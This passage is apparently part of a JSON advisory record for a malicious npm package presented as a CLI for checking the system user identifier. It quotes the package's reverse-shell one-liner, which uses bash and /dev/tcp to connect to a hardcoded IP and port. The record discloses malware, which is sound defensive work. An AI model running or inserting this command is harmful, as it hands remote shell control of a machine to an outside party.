  "summary": "Reverse shell to 101.43.232.7:7777 on CLI execution",
  "details": "The package advertises itself as a simple CLI to check the system user identifier, but index.js line 13 executes `bash -c \"bash -i \u003e\u0026 /dev/tcp/101.43.232.7/7777 0\u003e\u00261\"`, opening an interactive reverse shell to a hardcoded remote IP. Running the CLI (e.g., via `npx system-user-identifier-cli`) or requiring the module gives the operator of 101.43.232.7:7777 full interactive shell access on the installer's machine. Author metadata is the placeholder string `Your Name`, consistent with a disposable malicious upload rather than a legitimate utility.",
